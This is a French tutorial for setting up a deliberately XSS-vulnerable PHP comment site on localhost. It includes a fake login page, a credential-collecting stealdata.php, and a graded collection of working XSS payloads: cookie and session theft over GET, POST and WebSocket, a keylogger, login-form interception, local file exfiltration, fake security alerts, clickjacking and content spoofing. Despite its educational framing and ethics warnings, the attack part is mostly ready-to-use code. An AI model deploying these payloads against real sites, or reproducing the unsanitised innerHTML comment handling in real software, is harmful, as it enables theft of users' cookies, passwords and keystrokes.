# Démo2

- Ce projet est un exemple complet et détaillé qui montre comment créer un site web vulnérable à des fins éducatives, en utilisant de vrais cookies. 
- Assurez-vous de configurer et d'exécuter ce projet dans un environnement sécurisé, comme une machine virtuelle isolée sous Kali Linux.

## Arborescence du système de fichiers

```
/demo2
├── index.html
├── comment.php
├── comments.json
├── stealdata.php
├── malicious.js
├── offer.html
├── fake.html
├── chat.php
└── set_cookies.html
```

## Prérequis

1. **Installation d'un serveur web local :**
   - Installez Apache et PHP. Vous pouvez utiliser XAMPP, WAMP, ou MAMP, ou configurer Apache et PHP directement sur Kali Linux.

2. **Déploiement des fichiers :**
   - Placez tous les fichiers dans le répertoire de votre serveur web. Par exemple, sur Kali Linux, placez-les dans le répertoire `/var/www/html/demo2/` :
     ```bash
     sudo mkdir /var/www/html/demo2
     sudo cp -r /path/to/your/files/* /var/www/html/demo2/
     ```

3. **Initialisation de comments.json :**
   - Assurez-vous que `comments.json` contient l'objet JSON vide suivant :
     ```json
     {
         "comments": []
     }
     ```

4. **Droits d'écriture :**
   - Assurez-vous que le serveur web a les droits d'écriture sur le fichier `comments.json`.
     ```bash
     sudo chown www-data:www-data /var/www/html/demo2/comments.json
     sudo chmod 664 /var/www/html/demo2/comments.json
     ```

## Étape par étape

### Étape 0 : Ajouter et voir des cookies fictifs

Pour tester les fonctionnalités XSS avec des cookies, nous devons d'abord ajouter des cookies fictifs et vérifier qu'ils sont bien présents.

#### 1. Création du fichier `set_cookies.html`

Créez un fichier nommé `set_cookies.html` avec le contenu suivant :

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Set and View Fake Cookies</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
</head>
<body>
    <div class="container mt-5">
        <h1>Set and View Fake Cookies</h1>
        <button id="setCookies" class="btn btn-primary">Set Fake Cookies</button>
        <button id="viewCookies" class="btn btn-secondary">View Cookies</button>
        <div id="cookieStatus" class="mt-3"></div>
        <div id="cookieList" class="mt-3"></div>
    </div>
    <script>
        document.getElementById('setCookies').addEventListener('click', function() {
            for (let i = 0; i < 10; i++) {
                document.cookie = `fakeCookie${i}=value${i}; path=/;`;
            }
            document.getElementById('cookieStatus').innerText = 'Fake cookies have been set!';
        });

        document.getElementById('viewCookies').addEventListener('click', function() {
            const cookies = document.cookie.split('; ').map(cookie => cookie.split('='));
            const cookieListDiv = document.getElementById('cookieList');
            cookieListDiv.innerHTML = '<h3>Current Cookies:</h3><ul class="list-group">';
            cookies.forEach(([name, value]) => {
                cookieListDiv.innerHTML += `<li class="list-group-item">${name}: ${value}</li>`;
            });
            cookieListDiv.innerHTML += '</ul>';
        });
    </script>
</body>
</html>
```

**Explication :** Ce fichier crée une page web avec deux boutons. Le premier bouton ajoute des cookies fictifs lorsque vous cliquez dessus, et le second bouton affiche les cookies actuels du navigateur.

**Ce que vous devriez voir :**
- Après avoir cliqué sur "Set Fake Cookies", un message "Fake cookies have been set!" devrait s'afficher.
- Après avoir cliqué sur "View Cookies", une liste des cookies ajoutés devrait s'afficher sous forme de liste.

#### 2. Accéder à la page pour créer et voir les cookies

- Ouvrez votre navigateur et accédez à `http://localhost/demo2/set_cookies.html`.
- Cliquez sur le bouton "Set Fake Cookies" pour ajouter les cookies fictifs.
- Cliquez sur le bouton "View Cookies" pour afficher les cookies actuellement définis dans le navigateur.

#### 3. Vérifier les cookies

Pour vérifier que les cookies ont été créés, ouvrez les outils de développement de votre navigateur (F12), allez dans l'onglet "Application" (ou "Storage" selon le navigateur), puis dans la section "Cookies". Vous devriez voir les cookies fictifs ajoutés.

### Étape 1 : Création de `index.html`

Créez un fichier `index.html` avec le contenu suivant :

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vulnerable Site</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
</head>
<body>
    <div class="container">
        <h1 class="mt-5">Comment Section</h1>
        <form method="post" action="comment.php" class="mb-3">
            <div class="form-group">
                <textarea class="form-control" name="comment" rows="4" placeholder="Leave a comment"></textarea>
            </div>
            <button type="submit" class="btn btn-primary">Post Comment</button>
        </form>
        <button onclick="undoLastComment()" class="btn btn-danger mb-5">Annuler le dernier commentaire</button>
        <div id="comments" class="mt-4">
            <!-- Comments will be loaded here -->
        </div>
    </div>
    <script>
        // Load comments from the server
        fetch('comments.json')
            .then(response => response.json())
            .then(data => {
                let commentsDiv = document.getElementById('comments');
                data.comments.forEach(comment => {
                    let p = document.createElement('p');
                    p.innerHTML = comment;
                    commentsDiv.appendChild(p);
                });
            });

        // Function to undo the last comment
        function undoLastComment() {
            fetch('comments.json')
                .then(response => response.json())
                .then(data => {
                    data.comments.pop();
                    fetch('save_comments.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(data)
                    })
                    .then(response => response.text())
                    .then(result => {
                        if (result === 'success') {
                            location.reload();
                        } else {
                            alert('Erreur lors de la suppression du dernier commentaire');
                        }
                    });
                });
        }
    </script>
</body>
</html>
```

**Explication :** Ce fichier crée une page web avec un formulaire pour soumettre des commentaires et un bouton pour annuler le dernier commentaire ajouté. Les commentaires sont chargés à partir de `comments.json`.

**Ce que vous devriez voir :**
- Une page avec un formulaire pour ajouter des commentaires.
- Les commentaires existants chargés et affichés dans la section "Comment Section".

### Étape 2 : Création de `comment.php`

Créez un fichier `comment.php` avec le contenu suivant :

```php
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['comment'])) {
    $comment = $_POST['comment'];
    $data = json_decode(file_get_contents('comments.json'), true);
    if (json_last_error() === JSON_ERROR_NONE) {
        $data['comments'][] = $comment;
        file_put_contents('comments.json', json_encode($data));
        header('Location: index.html');
    } else {
        error_log('JSON error: ' . json_last_error_msg());
        header('Location: index.html');
    }
} else {
    header('Location: index.html');
}
?>
```

**Explication :** Ce fichier reçoit les commentaires soumis via le formulaire et les enregistre dans `comments.json`.

**Ce que vous devriez voir :**
- Lorsque vous soumettez un commentaire via le formulaire, il est ajouté à `comments.json` et affiché sur la page.

### Étape 3 : Création de `save_comments.php`

Créez un fichier `save_comments.php` avec le contenu suivant :

```php
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    file_put_contents('comments.json', json_encode($data));
    if (json_last_error() === JSON_ERROR_NONE) {
        echo 'success';
    } else {
        echo 'error';
    }
} else {
    echo 'Invalid request method';
}
?>
```

**Explication :** Ce fichier reçoit les données JSON pour les commentaires et les enregistre dans `comments.json`. Il est utilisé par le bouton "Annuler le dernier commentaire".

**Ce que vous devriez voir :**
- Lorsque vous

 cliquez sur "Annuler le dernier commentaire", le dernier commentaire ajouté est supprimé et la page est rechargée.

### Étape 4 : Création de `comments.json`

Créez un fichier `comments.json` avec le contenu suivant :

```json
{
    "comments": []
}
```

**Explication :** Ce fichier stocke les commentaires sous forme de JSON.

**Ce que vous devriez voir :**
- Ce fichier sera modifié lorsque des commentaires sont ajoutés ou supprimés.

### Étape 5 : Création des autres fichiers nécessaires

Créez les fichiers suivants avec le contenu respectif :

#### `stealdata.php`

```php
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['data'])) {
    $stolenData = $_POST['data'];
    file_put_contents('stolen_data.txt', $stolenData . "\n", FILE_APPEND);
}
?>
```

**Explication :** Ce fichier reçoit des données volées et les enregistre dans `stolen_data.txt`.

#### `malicious.js`

```javascript
document.onkeypress = function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://localhost/demo2/keystroke?key=' + e.key, true);
    xhr.send();
};
```

**Explication :** Ce fichier enregistre les frappes de clavier et les envoie à une URL spécifiée.

#### `offer.html`

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Exclusive Offer</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
</head>
<body>
    <div class="container text-center mt-5">
        <h1>Congratulations!</h1>
        <p>You have won an exclusive offer! Click <a href="http://localhost/demo2">here</a> to go back.</p>
    </div>
</body>
</html>
```

**Explication :** Ce fichier crée une page web avec une fausse offre exclusive.

#### `fake.html`

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Fake Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
</head>
<body>
    <div class="container mt-5">
        <h1>Login</h1>
        <form action="stealdata.php" method="post">
            <div class="form-group">
                <input type="text" name="username" class="form-control" placeholder="Username">
            </div>
            <div class="form-group">
                <input type="password" name="password" class="form-control" placeholder="Password">
            </div>
            <button type="submit" class="btn btn-primary">Login</button>
        </form>
    </div>
</body>
</html>
```

**Explication :** Ce fichier crée une page de connexion factice pour voler des informations d'identification.

#### `chat.php`

```php
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['message'])) {
    $message = $_POST['message'];
    file_put_contents('chat_log.txt', $message . "\n", FILE_APPEND);
}
?>
```

**Explication :** Ce fichier reçoit des messages de chat et les enregistre dans `chat_log.txt`.

### Étape 6 : Vérification de l'installation

1. **Accéder au site :**
   - Ouvrez votre navigateur et accédez à `http://localhost/demo2/` pour voir la page de commentaires.

2. **Soumettre un commentaire :**
   - Soumettez un commentaire via le formulaire pour voir comment les commentaires sont enregistrés et affichés.

3. **Annuler le dernier commentaire :**
   - Utilisez le bouton "Annuler le dernier commentaire" pour supprimer le dernier commentaire ajouté.

**Ce que vous devriez voir :**
- Les commentaires soumis sont affichés sur la page.
- Le bouton "Annuler le dernier commentaire" supprime le dernier commentaire ajouté et recharge la page.

### Étape 7 : Scripts de démonstration

#### Scripts de base

- **Redirection simple :**

```html
<script>
    window.location.href = "http://localhost/demo2/offer.html";
</script>
```

**Explication :** Ce script redirige l'utilisateur vers la page `offer.html`.

- **Affichage d'une alerte :**

```html
<script>
    alert('XSS Test');
</script>
```

**Explication :** Ce script affiche une alerte avec le message "XSS Test".

- **Affichage du cookie :**

```html
<script>
    alert(document.cookie);
</script>
```

**Explication :** Ce script affiche les cookies de l'utilisateur dans une alerte.

#### Scripts intermédiaires

- **Vol de cookies (simulé) :**

```html
<script>
    var img = new Image();
    img.src = 'http://localhost/demo2/stealdata.php?cookie=' + document.cookie;
</script>
```

**Explication :** Ce script envoie les cookies de l'utilisateur à l'URL spécifiée via une requête GET.

- **Envoi des cookies par POST :**

```html
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://localhost/demo2/stealdata.php', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('cookie=' + encodeURIComponent(document.cookie));
</script>
```

**Explication :** Ce script envoie les cookies de l'utilisateur à l'URL spécifiée via une requête POST.

- **Création d'un formulaire caché pour vol de données :**

```html
```html
<form id="stealData" action="http://localhost/demo2/stealdata.php" method="post">
    <input type="hidden" name="data" value="Sensitive Data">
</form>
<script>
    document.getElementById('stealData').submit();
</script>
```

**Explication :** Ce script crée et soumet un formulaire caché contenant des données sensibles.

#### Scripts avancés

- **Exécution d'un script externe :**

```html
<script src="http://localhost/demo2/malicious.js"></script>
```

**Explication :** Ce script inclut et exécute un fichier JavaScript externe.

- **Keylogger simple :**

```html
<script>
    document.onkeypress = function(e) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://localhost/demo2/keystroke?key=' + e.key, true);
        xhr.send();
    };
</script>
```

**Explication :** Ce script enregistre les frappes de clavier et les envoie à une URL spécifiée.

- **Interception des formulaires de login :**

```html
<script>
    var form = document.forms[0];
    form.onsubmit = function() {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://localhost/demo2/stealdata.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('username=' + form.username.value + '&password=' + form.password.value);
    };
</script>
```

**Explication :** Ce script intercepte la soumission d'un formulaire de connexion et envoie les données de connexion à une URL spécifiée.

- **Vol des informations de la session :**

```html
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://localhost/demo2/stealdata.php?session=' + encodeURIComponent(document.cookie), true);
    xhr.send();
</script>
```

**Explication :** Ce script envoie les informations de session de l'utilisateur à une URL spécifiée.

- **Affichage d'une fausse page de connexion :**

```html
<script>
    document.body.innerHTML = '<form action="http://localhost/demo2/fake.html" method="post"><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>';
</script>
```

**Explication :** Ce script remplace le contenu de la page par un formulaire de connexion factice.

- **Injection d'une balise script persistante (persistent XSS) :**

```html
<script>
    document.write('<script src="http://localhost/demo2/malicious.js"><\/script>');
</script>
```

**Explication :** Ce script injecte une balise script persistante sur la page.

#### Scripts très avancés

- **Utilisation de WebSockets pour exfiltrer des données :**

```html
<script>
    var ws = new WebSocket('ws://localhost/demo2/socket');
    ws.onopen = function() {
        ws.send('Exfiltrating data...');
        ws.send(document.cookie);
    };
</script>
```

**Explication :** Ce script utilise les WebSockets pour envoyer des données en temps réel à une URL spécifiée.

- **Exploitation de l'API FileReader pour voler des fichiers locaux (avec interaction utilisateur) :**

```html
<script>
    var input = document.createElement('input');
    input.type = 'file';
    input.onchange = function(event) {
        var file = event.target.files[0];
        var reader = new FileReader();
        reader.onload = function(e) {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'http://localhost/demo2/upload', true);
            xhr.setRequestHeader('Content-Type', 'application/octet-stream');
            xhr.send(e.target.result);
        };
        reader.readAsBinaryString(file);
    };
    document.body.appendChild(input);
</script>
```

**Explication :** Ce script crée un élément input de type fichier et utilise l'API FileReader pour lire et envoyer le contenu du fichier à une URL spécifiée.

- **Déclenchement de fausses alertes de sécurité :**

```html
<script>
    alert('Your system is infected! Click OK to fix.');
    window.location.href = 'http://localhost/demo2/fix';
</script>
```

**Explication :** Ce script affiche une fausse alerte de sécurité et redirige l'utilisateur vers une URL spécifiée.

- **Interception des clics utilisateur (clickjacking) :**

```html
<style>
    #clickjacker {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        opacity: 0;
    }
</style>
<iframe id="clickjacker" src="http://localhost/demo2"></iframe>
```

**Explication :** Ce script utilise une iframe transparente pour intercepter les clics de l'utilisateur et les rediriger vers une URL spécifiée.

- **Déclenchement de fausses fenêtres de chat :**

```html
<script>
    document.body.innerHTML = '<div id="chat" style="position:fixed;bottom:0;width:100%;background:#fff;border-top:1px solid #ccc;padding:10px;"><input type="text" id="chatInput" placeholder="Type your message here"><button onclick="sendMessage()">Send</button></div>';
    function sendMessage() {
        var message = document.getElementById('chatInput').value;
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://localhost/demo2/chat.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('message=' + encodeURIComponent(message));
    }
</script>
```

**Explication :** Ce script affiche une fausse fenêtre de chat et envoie les messages saisis par l'utilisateur à une URL spécifiée.

- **Injection de fausses pages de contenu (content spoofing) :**

```html
<script>
    document.body.innerHTML = '<h1>Exclusive Offer!</h1><p>Click <a href="http://localhost/demo2/offer.html">here</a> to claim your prize!</p>';
</script>
```

**Explication :** Ce script remplace le contenu de la page par une fausse offre exclusive.

## Remarques importantes

- **N'utilisez ces scripts que dans un environnement contrôlé et à des fins éducatives.**
- **Assurez-vous d'obtenir les permissions nécessaires pour effectuer ces tests sur les systèmes concernés.**

La sécurité informatique est une responsabilité partagée, et l'apprentissage des vulnérabilités doit toujours s'accompagner d'un fort sens de l'éthique et du respect des lois en vigueur.

---

- En suivant ces étapes détaillées et en utilisant les fichiers fournis, les apprenants peuvent créer un site web vulnérable et comprendre les implications des failles XSS de manière pédagogique et sécurisée. 
- Les fonctionnalités pour ajouter et visualiser des cookies fictifs permettent de tester les scripts dans un environnement contrôlé.
